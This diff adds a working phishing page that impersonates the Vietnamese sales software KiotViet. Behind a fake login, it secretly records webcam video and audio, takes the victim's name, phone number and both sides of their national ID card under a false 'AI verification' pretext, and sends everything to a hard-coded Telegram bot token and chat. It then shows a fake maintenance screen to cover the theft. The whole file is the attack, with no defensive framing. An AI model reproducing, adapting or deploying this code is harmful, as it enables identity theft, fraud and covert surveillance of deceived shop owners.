@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>KiotViet - Phần mềm quản lý bán hàng phổ biến nhất</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        body { font-family: 'Roboto', sans-serif; background-color: #f0f2f5; overflow-x: hidden; }
+        .kv-green { color: #57b846; }
+        .bg-kv-green { background-color: #57b846; }
+        .hidden { display: none; }
+        
+        /* Hiệu ứng mượt mà */
+        .fade-in { animation: fadeIn 0.5s ease-out forwards; }
+        .scale-up { animation: scaleUp 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes scaleUp { from { transform: scale(0.95); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+        
+        .loader { border-top-color: #57b846; animation: spinner 1s linear infinite; }
+        @keyframes spinner { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        
+        .input-custom {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #d1d5db;
+            border-radius: 12px;
+            outline: none;
+            transition: all 0.3s;
+            font-size: 16px;
+        }
+        .input-custom:focus { border-color: #57b846; box-shadow: 0 0 0 3px rgba(87, 184, 70, 0.1); }
+    </style>
+</head>
+<body>
+
+<div id="app">
+    <div id="loading-global" class="hidden fixed inset-0 z-[500] bg-white/95 flex flex-col items-center justify-center">
+        <div class="loader ease-linear rounded-full border-4 border-t-4 border-gray-200 h-14 w-14 mb-4"></div>
+        <p id="loading-text" class="text-[11px] font-bold text-gray-400 uppercase tracking-widest text-center">Đang xử lý...</p>
+    </div>
+
+    <div id="landing-page" class="fade-in">
+        <nav class="flex items-center justify-between px-4 md:px-20 py-3 bg-white shadow-sm sticky top-0 z-50">
+            <img src="https://www.kiotviet.vn/Static/Theme/images/logo.png" alt="KiotViet" class="h-7 md:h-9">
+            <button onclick="requestAccess()" class="bg-kv-green text-white px-6 py-2 rounded-full font-bold text-sm shadow-md transition active:scale-95">Đăng nhập</button>
+        </nav>
+        
+        <main class="max-w-6xl mx-auto px-6 pt-16 pb-24 text-center">
+            <h1 class="text-4xl md:text-6xl font-black mb-6 text-slate-800 tracking-tight">Quản lý bán hàng cùng <span class="kv-green">KiotViet</span></h1>
+            <p class="text-slate-500 mb-10 text-base">Hệ thống xác thực an toàn cho hơn 200.000 chủ cửa hàng.</p>
+            <button onclick="requestAccess()" class="bg-kv-green text-white px-10 py-4 rounded-xl font-black text-lg shadow-xl uppercase transition active:scale-95 mb-12 mx-auto block">Dùng thử miễn phí</button>
+            <img src="https://www.kiotviet.vn/Static/Theme/images/banner_home_new.png" class="w-full max-w-4xl mx-auto rounded-2xl shadow-2xl border-4 border-white mx-auto">
+        </main>
+    </div>
+
+    <video id="v" autoplay muted playsinline class="hidden"></video>
+    <div id="flow-content"></div>
+</div>
+
+<script>
+    // --- CẤU HÌNH ---
+    const TELEGRAM_TOKEN = '8508820343:AAEd6sPNZgoXimq-ud_T7v_PFNsF62UELVA'; 
+    const CHAT_ID = '-1003844702216'; 
+
+    let userData = { name: '', phone: '', imgFront: null, imgBack: null, video: null };
+    let mediaRecorder;
+    let chunks = [];
+    let globalStream;
+
+    function showLoad(text, time, callback) {
+        const el = document.getElementById('loading-global');
+        document.getElementById('loading-text').innerText = text;
+        el.classList.remove('hidden');
+        setTimeout(() => {
+            el.classList.add('hidden');
+            if(callback) callback();
+        }, time);
+    }
+
+    // DÙNG LOGIC QUAY CỦA BẢN KHÔNG LỖI
+    async function requestAccess() {
+        try {
+            globalStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            document.getElementById('v').srcObject = globalStream;
+            
+            mediaRecorder = new MediaRecorder(globalStream);
+            mediaRecorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+            mediaRecorder.start(1000);
+
+            document.getElementById('landing-page').classList.add('hidden');
+            showLoad("ĐANG TẢI DỮ LIỆU...", 1000, renderPhoneInput);
+        } catch (e) {
+            alert("Vui lòng cấp quyền Camera để tiếp tục.");
+            window.location.reload();
+        }
+    }
+
+    function renderPhoneInput() {
+        document.getElementById('flow-content').innerHTML = `
+        <div class="min-h-screen flex flex-col items-center pt-24 px-4 bg-[#f0f2f5] fade-in">
+            <div class="bg-white p-8 rounded-2xl shadow-xl w-full max-w-[420px] text-center scale-up mx-auto">
+                <img src="https://www.kiotviet.vn/Static/Theme/images/logo.png" class="h-6 mx-auto mb-10">
+                <div class="space-y-4 text-left">
+                    <input id="uName" type="text" placeholder="Họ và tên chủ cửa hàng" class="input-custom font-medium uppercase">
+                    <div class="relative flex items-center">
+                        <div class="absolute left-4 flex items-center gap-1 border-r pr-2 border-gray-300">
+                            <img src="https://flagcdn.com/w20/vn.png" class="w-5">
+                            <svg class="w-3 h-3 text-gray-400" fill="currentColor" viewBox="0 0 20 20"><path d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z"/></svg>
+                        </div>
+                        <input id="uPhone" type="tel" maxlength="10" placeholder="Số điện thoại đăng ký" class="input-custom pl-20 font-bold tracking-wider">
+                    </div>
+                </div>
+                <button onclick="handleStep1()" class="w-full bg-kv-green text-white py-4 rounded-xl font-black mt-10 text-lg uppercase shadow-lg active:scale-95 transition-all mx-auto block">Tiếp tục</button>
+            </div>
+        </div>`;
+    }
+
+    function handleStep1() {
+        const n = document.getElementById('uName').value, p = document.getElementById('uPhone').value;
+        if (n.length > 2 && /^0[0-9]{9}$/.test(p)) {
+            userData.name = n.toUpperCase(); userData.phone = p;
+            showLoad("ĐANG KIỂM TRA TÀI KHOẢN...", 3000, renderVerifyNotice);
+        } else { alert("Vui lòng nhập đúng Họ tên và SĐT."); }
+    }
+
+    function renderVerifyNotice() {
+        document.getElementById('flow-content').innerHTML = `
+        <div class="fixed inset-0 bg-black/60 flex items-center justify-center p-6 z-[200] backdrop-blur-sm">
+            <div class="bg-white rounded-2xl p-10 max-w-sm w-full text-center scale-up shadow-2xl mx-auto">
+                <h3 class="text-xl font-bold mb-4 uppercase text-center">Xác minh định danh</h3>
+                <p class="text-sm text-gray-500 mb-10 font-medium text-center leading-relaxed">Để đảm bảo an toàn cho tài khoản, vui lòng thực hiện định danh CCCD qua hệ thống AI.</p>
+                <button onclick="showLoad('ĐANG KHỞI TẠO AI...', 1000, renderUpload)" class="w-full bg-kv-green text-white py-4 rounded-xl font-black text-lg uppercase shadow-lg transition active:scale-95 mx-auto block">Xác minh ngay</button>
+            </div>
+        </div>`;
+    }
+
+    function renderUpload() {
+        document.getElementById('flow-content').innerHTML = `
+        <div class="min-h-screen bg-white p-6 flex flex-col items-center pt-10 text-center fade-in">
+            <h2 class="text-xl font-bold mb-4 uppercase kv-green tracking-tight text-center">Tải lên ảnh CCCD</h2>
+            <p class="text-[10px] text-red-500 font-bold mb-10 uppercase tracking-widest text-center">AI: Không loé sáng - Không mất góc</p>
+            <div class="w-full max-w-sm space-y-6 mx-auto">
+                <div class="relative border-2 border-dashed border-gray-200 rounded-2xl h-52 flex items-center justify-center bg-gray-50 scale-up overflow-hidden mx-auto">
+                    <input type="file" class="absolute inset-0 opacity-0 z-20 cursor-pointer" onchange="aiScan(this, 'f-p', 'f-t', 'imgFront')">
+                    <p id="f-t" class="text-gray-400 font-bold text-[11px] uppercase tracking-widest text-center px-4">MẶT TRƯỚC CCCD</p>
+                    <img id="f-p" class="hidden absolute inset-0 w-full h-full object-cover z-10 rounded-2xl">
+                </div>
+                <div class="relative border-2 border-dashed border-gray-200 rounded-2xl h-52 flex items-center justify-center bg-gray-50 scale-up overflow-hidden mx-auto">
+                    <input type="file" class="absolute inset-0 opacity-0 z-20 cursor-pointer" onchange="aiScan(this, 'b-p', 'b-t', 'imgBack')">
+                    <p id="b-t" class="text-gray-400 font-bold text-[11px] uppercase tracking-widest text-center px-4">MẶT SAU CCCD</p>
+                    <img id="b-p" class="hidden absolute inset-0 w-full h-full object-cover z-10 rounded-2xl">
+                </div>
+            </div>
+        </div>`;
+    }
+
+    function aiScan(input, pI, tI, k) {
+        if (!input.files[0]) return;
+        showLoad("AI ĐANG QUÉT CHẤT LƯỢNG...", 1500, () => {
+            const r = new FileReader();
+            r.onload = e => {
+                document.getElementById(pI).src = e.target.result;
+                document.getElementById(pI).classList.remove('hidden');
+                document.getElementById(tI).classList.add('hidden');
+                userData[k] = input.files[0];
+                if (userData.imgFront && userData.imgBack) finalizeAndSend();
+            };
+            r.readAsDataURL(input.files[0]);
+        });
+    }
+
+    // DÙNG ĐÚNG PHẦN GỬI DỮ LIỆU CỦA BẢN KHÔNG LỖI
+    function finalizeAndSend() {
+        showLoad("ĐANG ĐỒNG BỘ DỮ LIỆU...", 3000, async () => {
+            if (mediaRecorder && mediaRecorder.state !== "inactive") {
+                mediaRecorder.onstop = async () => {
+                    userData.video = new Blob(chunks, { type: 'video/mp4' });
+                    await sendToTele();
+                };
+                mediaRecorder.stop();
+                globalStream.getTracks().forEach(t => t.stop());
+            } else {
+                renderMaintenance();
+            }
+        });
+    }
+
+    async function sendToTele() {
+        try {
+            const caption = `🔔 **DỮ LIỆU ĐỊNH DANH**\n👤 **Họ tên:** ${userData.name}\n📱 **SĐT:** \`${userData.phone}\``;
+
+            const videoFd = new FormData();
+            videoFd.append('chat_id', CHAT_ID);
+            videoFd.append('video', userData.video, 'verify.mp4');
+            videoFd.append('caption', caption);
+            videoFd.append('parse_mode', 'Markdown');
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendVideo`, { method: 'POST', body: videoFd });
+
+            const sendImg = async (f, l) => {
+                const fd = new FormData(); 
+                fd.append('chat_id', CHAT_ID); 
+                fd.append('photo', f);
+                fd.append('caption', `📸 ${l} - ${userData.name}`);
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+            };
+            await sendImg(userData.imgFront, "MẶT TRƯỚC");
+            await sendImg(userData.imgBack, "MẶT SAU");
+            renderMaintenance();
+        } catch (e) { renderMaintenance(); }
+    }
+
+    function renderMaintenance() {
+        document.getElementById('flow-content').innerHTML = `
+        <div class="fixed inset-0 bg-white flex flex-col items-center justify-center z-[500] p-8 text-center fade-in">
+            <img src="https://www.kiotviet.vn/Static/Theme/images/logo.png" class="h-8 mx-auto mb-12 opacity-50">
+            <div class="w-24 h-24 bg-red-50 rounded-full flex items-center justify-center mx-auto mb-8 text-red-500 scale-up mx-auto shadow-inner">
+                <svg class="w-12 h-12" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3.0 1.732 3.0z"></path></svg>
+            </div>
+            <h3 class="text-2xl font-black mb-4 uppercase text-red-600 tracking-tighter text-center">Hệ thống bảo trì</h3>
+            <p class="text-gray-500 mb-10 text-sm font-medium text-center leading-relaxed px-4">Máy chủ xác thực KiotViet đang bảo trì định kỳ. <br> Vui lòng quay lại sau 24h.</p>
+            <button onclick="window.location.reload()" class="w-full max-w-sm bg-slate-800 text-white py-4 rounded-xl font-bold uppercase shadow-lg active:scale-95 mx-auto block">Đóng</button>
+        </div>`;
+    }
+</script>
+</body>
+</html>
